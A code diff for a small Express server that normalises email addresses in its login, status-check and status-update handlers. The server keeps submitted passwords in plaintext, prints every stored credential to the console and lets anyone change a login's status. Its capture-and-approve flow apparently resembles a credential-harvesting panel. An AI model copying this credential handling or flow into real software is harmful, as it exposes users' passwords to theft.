@@ -20,7 +20,8 @@ app.get("/", (req, res) => {
 });
 
 app.post("/login", (req, res) => {
-  const { email, password } = req.body;
+  const email = req.body.email.trim().toLowerCase();
+  const password = req.body.password;
 
   pendingUsers[email] = { password, status: "pending" };
   console.log(`📥 Login: ${email}`);
@@ -31,13 +32,15 @@ app.post("/login", (req, res) => {
 });
 
 app.get("/check-status", (req, res) => {
-  const { email } = req.query;
+  const email = (req.query.email || '').trim().toLowerCase();
+
   if (!pendingUsers[email]) return res.json({ status: "unknown" });
   res.json({ status: pendingUsers[email].status });
 });
 
 app.post("/update-status", (req, res) => {
-  const { email, status } = req.body;
+  const email = (req.body.email || '').trim().toLowerCase();
+  const status = req.body.status;
 
   console.log("📬 Update Status Received:", email, status);
   console.log("📌 All Users:", pendingUsers);
@@ -51,6 +54,7 @@ app.post("/update-status", (req, res) => {
     return res.json({ ok: false, message: "User not found" });
   }
 });
+
 
 
 setInterval(() => {
